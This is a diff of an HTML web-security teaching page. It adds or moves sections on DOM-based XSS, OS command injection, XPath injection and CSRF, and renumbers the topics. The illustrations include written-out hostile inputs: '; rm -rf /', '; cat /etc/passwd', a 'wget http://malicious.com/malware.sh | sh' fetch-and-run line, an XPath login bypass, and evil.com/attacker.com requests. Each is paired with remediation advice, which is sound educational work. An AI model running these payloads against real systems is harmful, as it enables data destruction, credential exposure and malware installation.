@@ -477,10 +477,11 @@
             <li><a href="#privilege-escalation-via-response-manipulation" class="active"><i class="fas fa-chevron-right"></i>Privilege Escalation Via Response Manipulation</a></li>
             <li><a href="#reflected-cross-site-scripting" class="active"><i class="fas fa-chevron-right"></i>Reflected Cross-Site Scripting</a></li>
             <li><a href="#stored-cross-site-scripting" class="active"><i class="fas fa-chevron-right"></i>Stored Cross-Site Scripting</a></li>
-            <li><a href="#cross-site-request-forgery" class="active"><i class="fas fa-chevron-right"></i>Cross-Site Request Forgery</a></li>
-            <li><a href="#cross-origin-resource-sharing" class="active"><i class="fas fa-chevron-right"></i>Cross-Origin Resource Sharing</a></li>                                         
+            <li><a href="#dom-cross-site-scripting" class="active"><i class="fas fa-chevron-right"></i>DOM-based Cross-Site Scripting</a></li>                                         
             <li><a href="#sql-injection" class="active"><i class="fas fa-chevron-right"></i>SQL Injection</a></li>
             <li><a href="#html-injection" class="active"><i class="fas fa-chevron-right"></i>HTML Injection</a></li>
+            <li><a href="#os-command-injection" class="active"><i class="fas fa-chevron-right"></i>OS Command Injection</a></li>
+            <li><a href="#xpath-injection" class="active"><i class="fas fa-chevron-right"></i>XPath Injection</a></li>
             <li><a href="#xml-injection" class="active"><i class="fas fa-chevron-right"></i>XML External Entity (XXE) Injection</a></li>
             <li><a href="#ssi-injection" class="active"><i class="fas fa-chevron-right"></i>Server-Side Includes (SSI)</a></li>
             <li><a href="#server-side-request-forgery" class="active"><i class="fas fa-chevron-right"></i>Server-Side Request Forgery (SSRF)</a></li>
@@ -488,10 +489,9 @@
             <li><a href="#local-file-inclusion"><i class="fas fa-chevron-right"></i> Local File Inclusion</a></li>
             <li><a href="#remote-file-inclusion"><i class="fas fa-chevron-right"></i> Remote File Inclusion</a></li>
             <li><a href="#directory-traversal"><i class="fas fa-chevron-right"></i> Directory Traversal</a></li>
-
-            
-            
-
+            <li><a href="#cross-site-request-forgery" class="active"><i class="fas fa-chevron-right"></i>Cross-Site Request Forgery</a></li>
+            <li><a href="#cross-origin-resource-sharing" class="active"><i class="fas fa-chevron-right"></i>Cross-Origin Resource Sharing</a></li>
+            <li><a href="#http-splitting-and-smuggling" class="active"><i class="fas fa-chevron-right"></i>HTTP Splitting and Smuggling</a></li>
             <li><a href="#security-headers" class="active"><i class="fas fa-chevron-right"></i> Security Headers</a></li>
             <li><a href="#secure-cookies"><i class="fas fa-chevron-right"></i> Secure Cookies</a></li>
             <li><a href="#local-storage"><i class="fas fa-chevron-right"></i> Local Storage Security</a></li>
@@ -564,18 +564,18 @@
                 </div>
                                 
                 <h3>🔗 Reference Links:</h3>
-                <p><a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control</a></p>
-                <p><a href="https://sudip-says-hi.medium.com/missing-function-level-access-control-a773990d8a63">https://sudip-says-hi.medium.com/missing-function-level-access-control-a773990d8a63</a></p>
-                <p><a href="https://www.geeksforgeeks.org/computer-networks/how-to-prevent-broken-access-control/">https://www.geeksforgeeks.org/computer-networks/how-to-prevent-broken-access-control/</a></p>
+                <p><a href="https://brightsec.com/blog/broken-authentication-impact-examples-and-how-to-fix-it/">https://brightsec.com/blog/broken-authentication-impact-examples-and-how-to-fix-it/</a></p>
+                <p><a href="https://www.strongdm.com/blog/authentication-vulnerabilities">https://www.strongdm.com/blog/authentication-vulnerabilities</a></p>
+                <p><a href="https://www.geeksforgeeks.org/ethical-hacking/broken-authentication-vulnerability/">https://www.geeksforgeeks.org/ethical-hacking/broken-authentication-vulnerability/</a></p>
             </div>
 
-            <!-- Topic 1: Privilege Escalation via Force Browsing -->
+            <!-- Topic 2: Privilege Escalation via Force Browsing -->
             <div id="privilege-escalation-via-froce-browsing" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>1. Privilege Escalation via Force Browsing</h2>
+                    <h2>2. Privilege Escalation via Force Browsing</h2>
                 </div>
                 
                 <h3>📌 Privilege Escalation via Force Browsing:</h3>
@@ -625,13 +625,13 @@
                 <p><a href="https://www.geeksforgeeks.org/computer-networks/how-to-prevent-broken-access-control/">https://www.geeksforgeeks.org/computer-networks/how-to-prevent-broken-access-control/</a></p>
             </div>
 
-            <!-- Topic 2: Privilege Escalation via Force Browsing -->
+            <!-- Topic 3: Privilege Escalation via Force Browsing -->
             <div id="privilege-escalation-via-backend" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>2. Privilege Escalation Via Backend Session Tokens</h2>
+                    <h2>3. Privilege Escalation Via Backend Session Tokens</h2>
                 </div>
                 
                 <h3>🧩 Privilege Escalation via Backend Session Cookie or Authorization Token Modification:</h3>
@@ -706,13 +706,13 @@
                 <p><a href="https://auth0.com/learn/json-web-tokens">https://auth0.com/learn/json-web-tokens</a></p>
             </div>
 
-            <!-- Topic 3: Privilege Escalation via Force Browsing -->
+            <!-- Topic 4: Privilege Escalation via Force Browsing -->
             <div id="privilege-escalation-via-response-manipulation" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>3. Privilege Escalation via Response Manipulation</h2>
+                    <h2>4. Privilege Escalation via Response Manipulation</h2>
                 </div>
                 
                 <h3>🧩 Privilege Escalation via Response Manipulation:</h3>
@@ -790,13 +790,13 @@
             </div>
 
 
-        <!-- Topic 4: Reflected Cross-Site Scripting -->
+        <!-- Topic 5: Reflected Cross-Site Scripting -->
             <div id="reflected-cross-site-scripting" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>4. Reflected Cross-Site Scripting</h2>
+                    <h2>5. Reflected Cross-Site Scripting</h2>
                 </div>
                 
                 <h3>🧩 Reflected Cross-Site Scripting (Reflected XSS):</h3>
@@ -863,13 +863,13 @@ Results for "apple"
             </div>
         </div>
 
-        <!-- Topic 5: Stored Cross-Site Scripting -->
+        <!-- Topic 6: Stored Cross-Site Scripting -->
             <div id="stored-cross-site-scripting" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>5. Stored Cross-Site Scripting</h2>
+                    <h2>6. Stored Cross-Site Scripting</h2>
                 </div>
                 
                 <h3>🧩 Stored XSS:</h3>
@@ -956,142 +956,57 @@ let clean = DOMPurify.sanitize(userHtml, {ALLOWED_TAGS: ['b','i','a','p','br']})
             </div>
         </div>
 
-       <!-- Topic 6: Cross-Site Request Forgery -->
-            <div id="cross-site-request-forgery" class="topic-card">
+           <!-- Topic 7: DOM-based Cross-Site Scripting (XSS) -->
+            <div id="dom-cross-site-scripting" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>6. Cross-Site Request Forgery</h2>
+                    <h2>7. DOM-based Cross-Site Scripting (XSS)</h2>
                 </div>
                 
-                <h3>🧩 Cross-Site Request Forgery:</h3>
-                <p>CSRF (Cross-Site Request Forgery) is an attack where a malicious website tricks a user’s browser into making unintended requests to a web application where the user is already authenticated.</p>
-                <p>The attacker does not steal credentials; instead, they exploit the user’s active session to perform actions on their behalf.</p>
-                <p>CSRF relies on the fact that browsers automatically send cookies or authentication tokens with requests.</p>
-                
-                <div class="example-box">
-                    <h3>Examples</h3>
-                    <p>You are logged into your bank. Visiting a malicious site could make your browser unknowingly send a money transfer request to your bank.</p>
+                <h3>🌐 DOM-based XSS:</h3>
+                <p>A DOM-based Cross-Site Scripting (XSS) vulnerability happens when malicious input is executed directly in the browser’s Document Object Model (DOM) via insecure client-side JavaScript. Unlike traditional XSS, the payload may never reach the server, making detection harder.</p>
+                <p>DOM-based XSS occurs when JavaScript on the client side dynamically updates the page using unsanitized user input.</p>
+                <b>Difference from other XSS:</b>
+                <p><b>Stored XSS:</b> Payload saved on the server and shown to users later.</p>
+                <p><b>Reflected XSS:</b> Payload sent to the server and reflected back in the response.</p>
+                <p><b>DOM-based XSS:</b> Payload is processed entirely in the browser’s DOM without server involvement.</p>
+                <b>Example:</b>
+                <img src="Images/Dom-XSS-2.png" width="100%" height="auto">
 
                 <div class="warning-box">
                     <h3>💥 Impact of the Issue</h3>
-                    <p><b>Account takeover:</b> change password, email, or profile settings.</p>
-                    <p><b>Financial loss:</b> initiate bank transfers or payments.</p>
-                    <p><b>Data manipulation:</b> modify or delete sensitive data.</p>
-                    <p><b>Privilege escalation: </b>perform admin actions if the victim is an admin.</p>
+                    <p><b>Session Hijacking:</b> Steal cookies or tokens to impersonate users.</p>
+                    <p><b>Data Theft:</b> Extract sensitive information from web pages.</p>
+                    <p><b>Phishing & Defacement:</b> Inject fake login forms or misleading content.</p>
+                    <p><b>Malware Delivery:</b> Redirect users to malicious sites or load malware scripts.</p>
+                    <p><b>Bypassing Security Tools:</b> Since payloads may not hit the server, traditional firewalls and logs may miss them.</p>
                 </div>
-                <p>Severity depends on what actions are available to the authenticated user.</p>
                 
                 <div class="attack-scenario-box">
-                    <h3>⚠️ How CSRF Works (Attack Scenario)</h3>
-                    <b>Scenario 1 — Simple CSRF (GET request)</b>
-                    <p>1. Victim is logged in to example.com.</p>
-                    <p>2. Attacker hosts a page with:</p>
-                    <!-- <img src="https://example.com/change-email?email=attacker@evil.com" /> -->
-                    <img src="Images/CSRF-1.png" width="100%" height="auto">
-                    <p>3. Browser automatically sends the session cookie to example.com.</p>
-                    <p>4. Victim’s email is changed without their knowledge.</p>                    
-                    <b>Scenario 2 — CSRF using POST request</b>
-                    <p>1. Attacker creates a hidden form:</p>
-                    <img src="Images/CSRF-2.png"width="100%" height="auto">
-                    <p>2. When a logged-in user visits the page, the form submits automatically.</p>
-                    <p>3. The bank transfers money to the attacker’s account.</p>
+                    <h3>🎭 Attacker Scenarios & Examples</h3>
+                    <img src="Images/Dom-XSS-2.png" width="100%" height="auto">
+                    <p><b>Phishing Attack:</b> Injects fake login form via DOM manipulation.</p>
+                    <p><b>Malvertising:</b> Injects malicious ads into the page using unsanitized query parameters.</p>
+                    <p><b>Real-World Example:</b> DOM-based XSS has been found in search bars, comment sections, and URL fragments where JavaScript directly processes user input without sanitization.</p>
                 </div>
 
                 <div class="remediation-box">
-                    <h3>🛠 Remediation (How to Prevent CSRF)</h3>
-                    <b>1. Use Anti-CSRF Tokens</b>
-                    <p>Include a unique token in forms or AJAX requests, tied to the user session.</p>
-                    <p>Server validates token before processing the request.</p>
-                    <p>Example (HTML form):</p>
-                    <img src="Images/CSRF-3.png" width="100%" height="auto">
-                    <p>JavaScript context: use JS string escaping or avoid embedding untrusted data into script blocks.</p>
-                    <p>URL context: percent-encode.</p>
-                    <p><b>2. Use SameSite Cookies</b>Set cookies with SameSite=Lax or SameSite=Strict to prevent them from being sent in cross-site requests.</p>
-                    <p><b>3. Verify Origin/Referer Header</b> Ensure requests come from your own domain before processing sensitive actions.</p>
-                    <p><b>4. Use Framework Protection</b> Most modern frameworks (Django, Rails, Laravel, Spring) have built-in CSRF protection.</p>
-                    <p><b>5. Avoid GET for state-changing actions</b> Only use POST, PUT, DELETE for actions that modify data.</p>
+                    <h3>🛠️ Remediation Strategies</h3>
+                    <p><b>Sanitize Input:</b> Use libraries like DOMPurify to clean user-supplied HTML/JS.</p>
+                    <p><b>Avoid Dangerous Functions:</b> Don’t use document.write(), innerHTML, or eval() with untrusted input.</p>
+                    <p><b>Use Safe APIs:</b> Prefer textContent or innerText to insert user data safely.</p>
+                    <p><b>Content Security Policy (CSP):</b> Restrict script execution sources.</p>
+                    <p><b>Regular Testing:</b> Include DOM-based XSS checks in penetration testing.</p>
+                    <p><b>Framework Security Features:</b> Use modern frameworks (React, Angular) that auto-escape user input.</p>
                 </div>
                                 
                 <h3>📚 Reference Links:</h3>
-                <p><a href="https://owasp.org/www-community/attacks/csrf">https://owasp.org/www-community/attacks/csrf</a></p>
-                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</a></p>
-                <p><a href="https://developer.mozilla.org/en-US/docs/Glossary/CSRF">https://developer.mozilla.org/en-US/docs/Glossary/CSRF</a></p>
-                <p><a href="https://portswigger.net/web-security/csrf">https://portswigger.net/web-security/csrf</a></p>
+                <p><a href="https://www.geeksforgeeks.org/javascript/dom-based-cross-site-scripting-attack-in-depth/">https://www.geeksforgeeks.org/javascript/dom-based-cross-site-scripting-attack-in-depth/</a></p>
+                <p><a href="https://pentest-tools.com/blog/xss-attacks-practical-scenarios">https://pentest-tools.com/blog/xss-attacks-practical-scenarios</a></p>
+                <p><a href="https://brightsec.com/blog/xss-attack/">https://brightsec.com/blog/xss-attack/</a></p>
             </div>
-        </div>
-
-        <!-- Topic 7: Cross-Site Request Forgery -->
-            <div id="cross-origin-resource-sharing" class="topic-card">
-                <div class="topic-header">
-                    <div class="topic-icon">
-                        <i class="fas fa-file-upload"></i>
-                    </div>
-                    <h2>7. Cross-Origin Resource Sharing</h2>
-                </div>
-                
-                <h3>🧩 CORS (Cross-Origin Resource Sharing):</h3>
-                <p>CORS (Cross-Origin Resource Sharing) is a browser security mechanism that controls whether a web page running on one origin (domain) can make requests to another origin and read the responses.</p>
-                <p><b>Same-Origin Policy (SOP):</b> by default, scripts can only access responses from the same origin.</p>
-                <p><b>CORS:</b> allows servers to relax SOP by specifying which origins are allowed to access their resources.</p>
-                <p><b>Important:</b> CORS is enforced by browsers only, not by the server. A misconfigured CORS policy can let attackers read sensitive data from your site.</p>
-                
-                <div class="example-box">
-                    <h3>Examples</h3>
-                    <p>You are logged into your bank. Visiting a malicious site could make your browser unknowingly send a money transfer request to your bank.</p>
-
-                <div class="warning-box">
-                    <h3>💥 Impact of the Issue</h3>
-                    <p><b>Steal sensitive data</b> from APIs (user info, emails, tokens).</p>
-                    <p><b>Hijack accounts</b> if authentication cookies are sent automatically.</p>
-                    <p><b>Perform unauthorized actions</b> by tricking logged-in users.</p>
-                    <p><b>Exfiltrate CSRF tokens or session info</b>, enabling further attacks.</p>
-                </div>
-                <p>Severity depends on what the API returns and whether credentials (cookies, tokens) are involved.</p>
-                
-                <div class="attack-scenario-box">
-                    <h3>🧪 Attack Scenarios & Examples</h3>
-                    <b>Scenario 1 — Malicious site steals data</b>
-                    <p>1. Victim is logged in to api.example.com.</p>
-                    <p>2. Victim visits attacker.com</p>
-                    <p>3. Attacker’s JS sends:</p>
-                    <!-- <img src="https://example.com/change-email?email=attacker@evil.com" /> -->
-                    <img src="Images/CORS-1.png" width="100%" height="auto">
-                    <p>If api.example.com allows the attacker’s origin via CORS, the browser sends the cookie and attacker reads the response.</p>                    
-                    <b>Scenario 2 — Origin reflection</b>
-                    <p>Server responds:</p>
-<pre>
-Access-Control-Allow-Origin: https://evil.com
-Access-Control-Allow-Credentials: true
-</pre>
-                    <p>Any attacker origin can bypass SOP and access sensitive data.</p>
-                </div>
-
-                <div class="remediation-box">
-                    <h3>🛠 Remediation (How to fix CORS issues)</h3>
-                    <b>1. Use strict origin whitelist</b>
-                    <p>Only allow trusted origins, e.g., https://app.example.com.</p>
-                    <b>2. Handle credentials safely</b>
-                    <p>If Access-Control-Allow-Credentials: true, never use * for origin.</p>
-                    <p>Prefer token-based auth over cookies where possible.</p>
-                    <b>3. Always validate authorization server-side</b>
-                    <p>Do not rely on CORS to protect sensitive endpoints.</p>
-                    <b>4. Limit methods & headers</b>
-                    <p>Only allow required HTTP methods (GET, POST) and headers.</p>
-                    <b>5. Use Vary: Origin</b>
-                    <p>Ensures caches do not serve wrong ACAO headers.</p>
-                    <b>6. Secure cookies</b>
-                    <p>Use HttpOnly, Secure, and SameSite flags to reduce risk.</p>
-                </div>
-                <h3>✅ Example of Safe CORS (Node.js Express)</h3>
-                <img src="Images/CORS-2.png" width="100%" height="auto">
-                <h3>📚 Reference Links:</h3>
-                <p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS">https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS</a></p>
-                <p><a href="https://owasp.org/www-project-secure-headers/#access-control-allow-origin">https://owasp.org/www-project-secure-headers/#access-control-allow-origin</a></p>
-                <p><a href="https://portswigger.net/web-security/cors">https://portswigger.net/web-security/cors</a></p>
-            </div>
-        </div>
 
         <!-- Topic 8: SQL Injection -->
             <div id="sql-injection" class="topic-card">
@@ -1099,7 +1014,7 @@ Access-Control-Allow-Credentials: true
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>7. SQL Injection (SQLi)</h2>
+                    <h2>8. SQL Injection (SQLi)</h2>
                 </div>
                 
                 <h3>🧩 SQL Injection (SQLi):</h3>
@@ -1222,16 +1137,16 @@ cmd.Parameters.AddWithValue("@id", id);
                 <p><a href="https://cwe.mitre.org/data/definitions/89.html">https://cwe.mitre.org/data/definitions/89.html</a></p>
                 <p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
             </div>
-        </div>
+            </div>
 
 
-        <!-- Topic 8: HTML Injection -->
+        <!-- Topic 9: HTML Injection -->
             <div id="html-injection" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>8. HTML Injection</h2>
+                    <h2>9. HTML Injection</h2>
                 </div>
                 
                 <h3>🧩 HTML Injection:</h3>
@@ -1301,14 +1216,121 @@ cmd.Parameters.AddWithValue("@id", id);
             </div>
         </div>
 
+        <!-- Topic 10: OS Command Injection -->
+            <div id="os-command-injection" class="topic-card">
+                <div class="topic-header">
+                    <div class="topic-icon">
+                        <i class="fas fa-file-upload"></i>
+                    </div>
+                    <h2>10. OS Command Injection</h2>
+                </div>
+                
+                <h3>🖥️ OS Command Injection</h3>
+                <p>An OS Command Injection vulnerability happens when an application takes user input and passes it directly to the operating system’s command shell without proper validation. Attackers can exploit this to run arbitrary commands, steal data, or fully compromise the server.</p>
+                <p>Also known as shell injection, it occurs when user input is concatenated into system-level commands.</p>
+                <p>Lack of input validation or unsafe use of functions like system(), exec(), or backticks in code.</p>
+                <b>Example:</b>
+<pre>
+http://example.com/ping?host=127.0.0.1; rm -rf /  
+</pre>
+                <p>The ; rm -rf / part is injected into the OS command, potentially deleting files.</p>
 
-        <!-- Topic 9: XXE Injection -->
+                <div class="warning-box">
+                    <h3>💥 Impact of the Issue</h3>
+                    <p><b>Data Breach:</b> Attackers can read sensitive files (e.g., /etc/passwd, database configs).</p>
+                    <p><b>System Takeover:</b> Arbitrary commands allow privilege escalation and remote control.</p>
+                    <p><b>Denial of Service (DoS):</b> Malicious commands can crash or overload the server.</p>
+                    <p><b>Pivoting:</b> Attackers can use the compromised server to attack other systems in the network.</p>
+                </div>
+                
+                <div class="attack-scenario-box">
+                    <h3>🎭 Attacker Scenarios & Examples</h3>
+                    <p><b>File Disclosure:</b> Attacker injects ; cat /etc/passwd to read system user info.</p>
+                    <p><b>Remote Control:</b> Injecting ; wget http://malicious.com/malware.sh | sh downloads and executes malware.</p>
+                    <p><b>Privilege Escalation:</b> Exploiting weak configurations to run commands as root.</p>
+                    <p><b>Real-World Example:</b> OS command injection has been found in vulnerable web apps where user-supplied parameters (like filenames or IP addresses) were passed directly to shell commands without sanitization.</p>
+                </div>
+
+                <div class="remediation-box">
+                    <h3>🛠 Remediation</h3>
+                    <p><b>1. Input Validation:</b> Strictly validate and sanitize user input.</p>
+                    <p><b>2. Avoid Direct OS Calls:</b> Use safe APIs or libraries instead of executing shell commands.</p>
+                    <p><b>3. Parameterized Functions:</b> Where possible, use functions that separate logic from input (e.g., prepared statements for DB).</p>
+                    <p><b>4. Least Privilege:</b> Run applications with minimal OS permissions.</p>
+                    <p><b>5. Escaping & Encoding:</b> Properly escape special characters if commands are unavoidable.</p>
+                    <p><b>6. Security Testing:</b> Regular penetration testing and code reviews to catch unsafe command usage.</p>
+                </div>
+
+                <h3>📚 Reference Links:</h3>
+                <p><a href="https://owasp.org/www-community/attacks/SQL_Injection">https://owasp.org/www-community/attacks/SQL_Injection</a></p>
+                <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a></p>
+                <p><a href="https://cwe.mitre.org/data/definitions/89.html">https://cwe.mitre.org/data/definitions/89.html</a></p>
+                <p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
+        </div>
+
+
+    <!-- Topic 11: XPath Command Injection -->
+            <div id="xpath-injection" class="topic-card">
+                <div class="topic-header">
+                    <div class="topic-icon">
+                        <i class="fas fa-file-upload"></i>
+                    </div>
+                    <h2>11. XPath Injection</h2>
+                </div>
+                
+                <h3>📂 XPath Injection</h3>
+                <p>An XPath Injection vulnerability occurs when user input is unsafely included in an XPath query used to search XML data. Attackers can manipulate the query to bypass authentication, extract sensitive data, or alter application logic. The fix is input validation, parameterized queries, and avoiding direct concatenation of user input into XPath expressions.</p>
+                <p>XPath is a query language for XML documents. XPath Injection happens when an application builds XPath queries using unsanitized user input.</p>
+                <p>Similar to SQL Injection, but targeting XML data sources instead of databases.</p>
+                <b>Example:</b>
+<pre>
+//users/user[username/text()='admin' and password/text()='1234'] 
+</pre>
+<p>If input is not sanitized, an attacker could enter:</p>
+<pre>
+' or '1'='1
+</pre>
+                <p>This changes the query logic to always return true, bypassing authentication.</p>
+
+                <div class="warning-box">
+                    <h3>💥 Impact of the Issue</h3>
+                    <p><b>Authentication Bypass:</b> Attackers log in without valid credentials.</p>
+                    <p><b>Data Exposure:</b> Sensitive XML data (usernames, passwords, IDs) can be extracted.</p>
+                    <p><b>Privilege Escalation:</b> Attackers may gain admin-level access.</p>
+                    <p><b>Application Manipulation:</b> Business logic relying on XML queries can be altered.</p>
+                    <p><b>Regulatory Risk:</b> Exposure of personal data can lead to compliance violations.</p>
+                </div>
+                
+                <div class="attack-scenario-box">
+                    <h3>🎭 Attacker Scenarios & Examples</h3>
+                    <p><b>Login Bypass:</b> Attacker enters ' or '1'='1 in the password field, gaining access without knowing the real password.</p>
+                    <p><b>Data Harvesting:</b> Injecting queries to list all usernames and passwords stored in XML.</p>
+                    <p><b>Privilege Escalation:</b> Manipulating queries to return admin accounts instead of normal users.</p>
+                    <p><b>Real-World Example:</b> Applications using XML for configuration or authentication (e.g., legacy systems, SAML-based apps) have been found vulnerable when developers directly concatenate user input into XPath queries.</p>
+                </div>
+
+                <div class="remediation-box">
+                    <h3>🛠 Remediation</h3>
+                    <p><b>1. Parameterized Queries:</b> Use APIs or libraries that separate query logic from user input.</p>
+                    <p><b>2. nput Validation & Sanitization:</b>I Reject or escape special characters (', ", //, []).</p>
+                    <p><b>3. Least Privilege:</b> Restrict XML data access to only what’s necessary.</p>
+                    <p><b>4. Error Handling:</b> Avoid detailed error messages that reveal query structure.</p>
+                    <p><b>5. Security Testing:</b> Include XPath Injection checks in penetration tests.</p>
+                </div>
+
+                <h3>📚 Reference Links:</h3>
+                <p><a href="https://learn.snyk.io/lesson/xpath-injection/?ecosystem=javascript">https://learn.snyk.io/lesson/xpath-injection/?ecosystem=javascript</a></p>
+                <p><a href="https://www.imperva.com/learn/application-security/xpath-injection/">https://www.imperva.com/learn/application-security/xpath-injection/</a></p>
+                <p><a href="https://www.geeksforgeeks.org/ethical-hacking/xpath-injection/">https://www.geeksforgeeks.org/ethical-hacking/xpath-injection/</a></p>
+        </div>
+
+        <!-- Topic 12: XXE Injection -->
             <div id="xml-injection" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>9. XML External Entity (XXE) Injection</h2>
+                    <h2>12. XML External Entity (XXE) Injection</h2>
                 </div>
                 
                 <h3>🧩 XML External Entity (XXE) Injection</h3>
@@ -1365,13 +1387,13 @@ factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
                 <p><a href="https://www.imperva.com/learn/application-security/xxe-xml-external-entity/">https://www.imperva.com/learn/application-security/xxe-xml-external-entity/</a></p>
             </div>
 
-    <!-- Topic 10: SSI Injection -->
+    <!-- Topic 13: SSI Injection -->
         <div id="ssi-injection" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>9. Server-Side Includes (SSI)</h2>
+                    <h2>13. Server-Side Includes (SSI)</h2>
                 </div>
                 
                 <h3>🧩 Server-Side Includes (SSI):</h3>
@@ -1441,13 +1463,13 @@ factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
 
 
 
-    <!-- Topic 10: Server-Side Request Forgery (SSRF) -->
+    <!-- Topic 14: Server-Side Request Forgery (SSRF) -->
             <div id="server-side-request-forgery" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>10. Server-Side Request Forgery (SSRF)</h2>
+                    <h2>14. Server-Side Request Forgery (SSRF)</h2>
                 </div>
                 
                 <h3>🧩 Server-Side Request Forgery (SSRF):</h3>
@@ -1623,13 +1645,13 @@ def safe_fetch(url):
             </div>
         </div>
     
-        <!-- Topic 11: File Upload Vulnerability -->
+        <!-- Topic 15: File Upload Vulnerability -->
             <div id="file-upload" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>11. File Upload Vulnerability</h2>
+                    <h2>15. File Upload Vulnerability</h2>
                 </div>
                 
                 <h3>📌 File Upload Vulnerability</h3>
@@ -1685,13 +1707,13 @@ def safe_fetch(url):
                 <p><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html</a></p>
             </div>
 
-        <!-- Topic 12: Local File Inclusion (LFI) -->
+        <!-- Topic 16: Local File Inclusion (LFI) -->
             <div id="local-file-inclusion" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>12. Local File Inclusion (LFI)</h2>
+                    <h2>16. Local File Inclusion (LFI)</h2>
                 </div>
                 
                 <h3>📌 Local File Inclusion (LFI)</h3>
@@ -1754,13 +1776,13 @@ http://example.com/index.php?page=../../../../tmp/sess_abcd1234
                 <p><a href="https://techtalkpine.com/2025/03/lfi-demo/">https://techtalkpine.com/2025/03/lfi-demo/</a></p>
             </div>
 
-        <!-- Topic 13: Remote File Inclusion (RFI) -->
+        <!-- Topic 17: Remote File Inclusion (RFI) -->
             <div id="remote-file-inclusion" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>13. Remote File Inclusion (RFI)</h2>
+                    <h2>17. Remote File Inclusion (RFI)</h2>
                 </div>
                 
                 <h3>📌 Remote File Inclusion (RFI)</h3>
@@ -1817,13 +1839,13 @@ http://victim.com/index.php?page=http://attacker.com/shell.php
                 <p><a href="https://letsdefend.io/blog/how-to-detect-lfi-and-rfi-attacks">https://letsdefend.io/blog/how-to-detect-lfi-and-rfi-attacks</a></p>
             </div>
 
-        <!-- Topic 14: Directory Traversal -->
+        <!-- Topic 18: Directory Traversal -->
             <div id="directory-traversal" class="topic-card">
                 <div class="topic-header">
                     <div class="topic-icon">
                         <i class="fas fa-file-upload"></i>
                     </div>
-                    <h2>14. Directory Traversal</h2>
+                    <h2>18. Directory Traversal</h2>
                 </div>
                 
                 <h3>📌 Remote File Inclusion (RFI)</h3>
@@ -1868,14 +1890,223 @@ http://example.com/getFile?name=../../etc/passwd
             </div>
 
 
+           <!-- Topic 19: Cross-Site Request Forgery -->
+            <div id="cross-site-request-forgery" class="topic-card">
+                <div class="topic-header">
+                    <div class="topic-icon">
+                        <i class="fas fa-file-upload"></i>
+                    </div>
+                    <h2>19. Cross-Site Request Forgery</h2>
+                </div>
+                
+                <h3>🧩 Cross-Site Request Forgery:</h3>
+                <p>CSRF (Cross-Site Request Forgery) is an attack where a malicious website tricks a user’s browser into making unintended requests to a web application where the user is already authenticated.</p>
+                <p>The attacker does not steal credentials; instead, they exploit the user’s active session to perform actions on their behalf.</p>
+                <p>CSRF relies on the fact that browsers automatically send cookies or authentication tokens with requests.</p>
+                
+                <div class="example-box">
+                    <h3>Examples</h3>
+                    <p>You are logged into your bank. Visiting a malicious site could make your browser unknowingly send a money transfer request to your bank.</p>
 
-            <!-- Topic 15: Security Headers -->
+                <div class="warning-box">
+                    <h3>💥 Impact of the Issue</h3>
+                    <p><b>Account takeover:</b> change password, email, or profile settings.</p>
+                    <p><b>Financial loss:</b> initiate bank transfers or payments.</p>
+                    <p><b>Data manipulation:</b> modify or delete sensitive data.</p>
+                    <p><b>Privilege escalation: </b>perform admin actions if the victim is an admin.</p>
+                </div>
+                <p>Severity depends on what actions are available to the authenticated user.</p>
+                
+                <div class="attack-scenario-box">
+                    <h3>⚠️ How CSRF Works (Attack Scenario)</h3>
+                    <b>Scenario 1 — Simple CSRF (GET request)</b>
+                    <p>1. Victim is logged in to example.com.</p>
+                    <p>2. Attacker hosts a page with:</p>
+                    <!-- <img src="https://example.com/change-email?email=attacker@evil.com" /> -->
+                    <img src="Images/CSRF-1.png" width="100%" height="auto">
+                    <p>3. Browser automatically sends the session cookie to example.com.</p>
+                    <p>4. Victim’s email is changed without their knowledge.</p>                    
